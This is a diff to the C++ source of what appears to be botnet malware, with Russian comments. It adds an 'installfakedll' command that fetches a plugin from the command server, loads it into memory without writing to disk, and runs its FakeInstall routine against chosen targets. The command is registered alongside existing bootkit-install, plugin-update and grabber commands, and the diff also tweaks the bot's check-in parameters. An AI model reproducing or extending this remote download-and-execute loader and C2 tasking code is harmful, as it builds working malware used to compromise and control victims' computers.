@@ -380,7 +380,7 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 	PStrings Fields = Strings::Create();
 
 	AddURLParam(Fields, "id", BotID.t_str());
-	AddURLParam(Fields, "Ver", (PCHAR)BOT_VERSION);
+	AddURLParam(Fields, "ver", (PCHAR)BOT_VERSION);
 
 	THTTPResponseRec Response;
 	ClearStruct(Response);
@@ -878,6 +878,86 @@ bool ExecuteAlert(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+// Тело потока команды installfakedll
+void AsyncInstallFakeDll(void* Arguments)
+{
+	PCHAR ParamList = (PCHAR)Arguments;
+
+	// В параметрах идет обязательный парамет PlugName и необяхательный Target
+	string PlugName = GetCommandParamByIndex(ParamList, 0);
+	string Target   = GetCommandParamByIndex(ParamList, 1);
+	
+	// После парсинга сразу освобождаем память списка
+	STR::Free(ParamList);
+
+	// Для сервера нужны только имена в нижнем регистре
+	STR::AnsiLowerCase(PlugName.t_str());
+
+	TASKDBG("AsyncInstallFakeDll", "Started with '%s'", PlugName.t_str());
+
+	DWORD  InstallerPlugSize = 0;
+	LPBYTE InstallerPlug = Plugin::DownloadEx(PlugName.t_str(), NULL, &InstallerPlugSize, true, false, NULL);
+	TASKDBG("AsyncInstallFakeDll", "Download() return body=0x%X size=%d", InstallerPlug, 
+		InstallerPlugSize);
+
+	do
+	{
+		TASKDBG("AsyncInstallFakeDll", "check is plug loaded from network");
+		// Проверяем загрузился ли плаг
+		if (InstallerPlug == NULL) break;
+
+		// Проверяем формат (PE)
+		TASKDBG("AsyncInstallFakeDll", "check file from network for PE");
+		if (!IsExecutableFile(InstallerPlug)) break;
+
+		HMEMORYMODULE Module = MemoryLoadLibrary(InstallerPlug);
+		TASKDBG("AsyncInstallFakeDll", "MemoryLoadLibrary() result=0x%X", Module);
+		if (Module == NULL) break;
+
+		// Installer.plug должен импортировать ф-ции Install(target, body, size).
+		typedef BOOL (WINAPI *FakeInstallFunction)(
+			const char* Target, 
+			const void* InstallerBody, 
+			DWORD InstallerBodySize
+			);
+
+		// Получаем и запускаем ф-цию FakeInstall
+		FakeInstallFunction FakeInstall = (FakeInstallFunction)MemoryGetProcAddress(Module, "FakeInstall");
+		TASKDBG("AsyncInstallFakeDll", "MemoryGetProcAddress('FakeInstall') result=0x%X", FakeInstall);
+		
+		if (FakeInstall == NULL) break;
+
+		TASKDBG("AsyncInstallFakeDll", "running FakeInstall.");
+		BOOL FakeInstallResult = FakeInstall(Target.t_str(), InstallerPlug, InstallerPlugSize);
+		
+		TASKDBG("AsyncInstallFakeDll", "Installation result=%d.", FakeInstallResult);
+
+		// TODO: По идее тут надо сделать какой-то отчет о результате выполнения команды.
+	}
+	while (0);
+
+	TASKDBG("AsyncInstallFakeDll", "Finished.");
+	if (InstallerPlug) MemFree(InstallerPlug);
+}
+
+
+// Команда скачивания и запуска инсталера FakeAutorunDll
+// Команда: installfakedll <InstallerName.plug> [<Target>]
+// <InstallerName.plug> - имя инсталятора на сервере
+// <Target> - необязательный параметр. Указывает конкретные цели установки. Если ничего не указано 
+//            ставится по все возможные цели, который поддерживает инсталятор.
+
+bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
+{
+	TASKDBG("ExecuteInstallFakeDll", "Args: '%s'", Args);
+
+	PCHAR ParamList = STR::New(Args);
+
+	StartThread(AsyncInstallFakeDll, ParamList);
+	return true;
+}
+
+
 
 //---------------------------------------------------------------------------
 
@@ -938,8 +1018,9 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 
 void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 {
-
 	// Регистрируем известные команды бота
+	TASKDBG("RegisterAllCommands", "Started with Manager=0x%X Commands=%u", 
+		Manager, Commands);
 
 	// Команда установки Bootkit из плага
 	RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);
@@ -949,6 +1030,9 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 
 	// Команда обновления плага
 	RegisterCommand(Manager, (PCHAR)Plugin::CommandUpdatePlug, Plugin::ExecuteUpdatePlug);
+
+	// Команда установки FakeDll
+	RegisterCommand(Manager, (PCHAR)"installfakedll", ExecuteInstallFakeDll);
 
 	// Команда grabber
 	#ifdef GrabberH
